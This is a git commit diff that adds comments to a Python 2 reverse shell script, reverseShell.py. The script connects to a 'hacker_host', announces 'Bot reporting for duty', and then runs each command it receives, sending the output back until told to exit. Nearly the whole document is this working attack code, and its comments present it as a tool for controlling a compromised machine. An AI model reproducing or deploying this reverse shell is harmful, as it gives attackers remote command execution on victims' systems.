e4c6a81b89e30ca1c94091ef5e1596242503ce83
Bobby Valenzuela <bobby.valenzuela@protonmail.com>
2023-01-08 20:03:22 -0800

    Add comments

--- reverseShells/reverseShell.py
+++ reverseShells/reverseShell.py
@@ -9,32 +9,39 @@ import sys
 from subprocess import Popen, PIPE
 from socket import *
 
-# Guard clause
+# Guard clause for arguments
 if len(sys.argv) < 2 :
     print "Missing one argument.\nUsage: {} <hacker_host> <port - optional>\nExiting.".format(sys.argv[0])
     exit()
 
 serverName = sys.argv[1]
-serverPort = sys.argv[2] if len(sys.argv) > 2 else 8000
+serverPort = sys.argv[2] if len(sys.argv) > 2 else 8000 # Use port 8000 by default
 
-print "SERVER: {} PORT: {}".format(serverName,serverPort)
+print "SERVER: {} PORT: {}".format(serverName,serverPort)  
 
-# Create IPv4 (AF_INET) TCPSocket (SOCK_STREAM) on this client machine
+# Create client IPv4 (AF_INET) TCPSocket (SOCK_STREAM)
 clientSocket = socket(AF_INET, SOCK_STREAM)
 
 # Create IPv6 (AF_INET) UDPSocket (SOCK_DGRAM)
 # clientSocket = socket(AF_INET6, SOCK_DGRAM)
 
+# Connect to hacker's machine
 clientSocket.connect((serverName,serverPort))
+
+# Send message to server (hacker) that we're ready 
+# Must encode msg as python socket library accepts/sends binary
 clientSocket.send('Bot reporting for duty'.encode())
 
+# Accept/decode any initial messages (commands) from server (max 4064 bytes)
 command = clientSocket.recv(4064).decode()
 
 while command != 'exit':
-
+    # Execute any received commands and parse output (output,err)
     proc = Popen(command.split(" "), stdout=PIPE, stderr=PIPE)
     result, err = proc.communicate()
+    # Send output/err back to server
     clientSocket.send(result)
+    # Accept/decode any subsequent commands
     command = (clientSocket.recv(4064)).decode()
 
 clientSocket.close()
